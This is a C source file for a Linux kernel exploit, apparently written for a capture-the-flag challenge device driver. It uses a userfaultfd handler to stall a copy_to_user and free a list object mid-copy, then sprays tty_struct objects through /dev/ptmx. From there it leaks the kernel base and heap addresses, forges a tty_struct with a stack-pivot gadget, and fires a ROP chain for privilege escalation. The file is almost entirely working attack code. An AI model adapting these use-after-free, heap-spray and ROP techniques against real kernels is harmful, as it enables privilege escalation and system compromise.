#define _GNU_SOURCE
#include <assert.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>
#include <poll.h>
#include <pthread.h>
#include <stdint.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include "userfaultfd.h"
#include "exp.h"




uint64_t uffd;
uint64_t fault_page;
uint64_t copy_page;
int spray[0x10];

void userfaultfd_handler(){ /* when we trigger the handler the current kernel execution stops when you first read or write a user page */
    if(sched_setaffinity(0, sizeof(cpu_set_t), &main_cpu)){puts("couldn't set main cpu.."); exit(1);}
    int fault_count;
    struct uffdio_copy uffdio_copy;
    struct uffd_msg msg;
    struct pollfd pollfd;
    pollfd.fd     = uffd;
    pollfd.events = POLLIN;
    if((copy_page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0)) < 0) {puts("Error: failed to map the page to copy.."); exit(1);}
    while(poll(&pollfd, 1, -1) > 0){
        if(read(uffd, &msg, sizeof(msg)) <= 0){puts("Error: failed to read userfaultfd msg or EOF.."); exit(1);}
        if(msg.event != UFFD_EVENT_PAGEFAULT){puts("Error: unexpected userfaultfd event.."); exit(1);}

        if(fault_count++ == 2){
            for(int i = 0; i < 0x100; i++){ioctl_add(copy_page, 1024);} // ?
        }
        if(ioctl_del(id) == -EINVAL){puts("failed to delete the list.."); exit(1);} // before copy_to_user
        for(int i = 0; i < 0x10; i++){if((spray[i]=open("/dev/ptmx", O_RDWR | O_NOCTTY)) < 0){puts("failed to spray.."); exit(1);}} // now spray kmalloc-1024, so now the freed object is tty_struct

        uffdio_copy.src  = copy_page;
        uffdio_copy.dst  = msg.arg.pagefault.address;
        uffdio_copy.len  = 0x1000;
        uffdio_copy.copy = 0;
        uffdio_copy.mode = 0; 
        if(ioctl(uffd, UFFDIO_COPY, &uffdio_copy) < 0){puts("Error: failed to copy userfaultfd page.."); exit(1);}
        //for(int i = 0; i < 0x1000; i += 8){printf("%d->%p\n", i / sizeof(uint64_t), *(uint64_t *)(copy_page+i));}
    }
}

int register_uffd(uint64_t page, size_t len){
    struct uffdio_api uffdio_api;
    struct uffdio_register uffdio_register;
    pthread_t th;
    if((uffd = syscall(__NR_userfaultfd, O_CLOEXEC | O_NONBLOCK)) == -1){ERROR("failed to create a new userfaultfd..")}
    uffdio_api.api      = UFFD_API;
    uffdio_api.features = 0;
    if(ioctl(uffd, UFFDIO_API, &uffdio_api) == -1){ERROR("failed to set uffdapi..")}
    uffdio_register.range.start = page;
    uffdio_register.range.len   = len;
    uffdio_register.mode        = UFFDIO_REGISTER_MODE_MISSING;
    if(ioctl(uffd, UFFDIO_REGISTER, &uffdio_register) == -1){ERROR("failed to register uffd to page..")}
    if(pthread_create(&th, NULL, userfaultfd_handler, NULL) == -1){ERROR("failed to create the userfault handler thread..")}
    return 0;
}

int main(int argc, char **argv){
    save_user_state();
    CPU_ZERO(&main_cpu);
    CPU_SET(0,&main_cpu);
    if(sched_setaffinity(0, sizeof(cpu_set_t), &main_cpu)){ERROR("couldn't set main cpu..")}
    if((fd=open(DEVICE_PATH, O_RDWR)) < 0){ERROR("failed to open the vulnerable device..")}
    fault_page = mmap(NULL, 0x3000, PROT_READ | PROT_WRITE, MAP_ANONYMOUS | MAP_PRIVATE, -1, 0);
    if(register_uffd(fault_page, 0x3000) < 0){return -1;}
    /*Add new list sized 1024(for kmalloc-1024)*/
    if((id=ioctl_add("unknownd4", 1024)) == -EINVAL){ERROR("the device failed to create a new blob list..")}
    /*now trigger userfault page handler by trying to copy_to_user to the faulting page*/
    if(ioctl_get(id, (char *)fault_page, 0x20) == -EINVAL){ERROR("failed to ioctl CMD_GET..")}
    // for some reason if we leak more than 0x38 we cannot get a reliable kernel leak
    uint64_t kbase = *(uint64_t *)(fault_page+0x18) - 0x0c3c3c0;
    printf("[+] Found kernel base at: %p\n", kbase);
    for(int i = 0; i < 0x10; i++){close(spray[i]);} // cleaning
    // now start over and leak the heap address
    if((id=ioctl_add("unknownd4", 1024)) == -EINVAL){ERROR("the device failed to create a new blob list..")}
    if(ioctl_get(id, (char *)fault_page+0x1000, 1024) == -EINVAL){ERROR("failed to ioctl CMD_GET..")}
    uint64_t kheap = *(uint64_t *)(fault_page+0x1038) - 0x38;
    printf("[+] Found kernel heap at: %p\n", kheap);
    for(int i = 0; i < 0x10; i++){close(spray[i]);} // cleaning
    
    *(uint64_t *)(fault_page+0x1000) = 0x0000000100005401; 
    *(uint64_t *)(fault_page+0x1008) = *(uint64_t *)(fault_page+0x8);
    *(uint64_t *)(fault_page+0x1010) = *(uint64_t *)(fault_page+0x10);
    *(uint64_t *)(fault_page+0x1018) = kheap;
    *(uint64_t *)(fault_page+0x1060) = push_rdx_cmp_eax_pop_rsp_rbp_ret;

    memcpy(fault_page+0x1108, create_rop_chain(kbase), 0x100);
    memcpy(copy_page, fault_page+0x1000, 1024);
    if((id=ioctl_add("unknownd4", 1024)) == -EINVAL){ERROR("the device failed to create a new blob list..")}
    if(ioctl_set(id, (char *)fault_page+0x2000, 1024) == -EINVAL){ERROR("failed to ioctl CMD_SET..")}
    
    for(int i = 0; i < 0x10; i++){ioctl(spray[i], 0, kheap+0x100/*rdx*/);} // start of the rop
    //for(int i = 0; i < 0x1000; i += 8){printf("%d->%p\n", i / sizeof(uint64_t), *(uint64_t *)(fault_page+0x2000+i));}
   // for(int i = 0; i < 0x1000; i += 8){printf("%d->%p\n", i / sizeof(uint64_t), *(uint64_t *)(fault_page+0x1000+i));}

    

    return 0;
}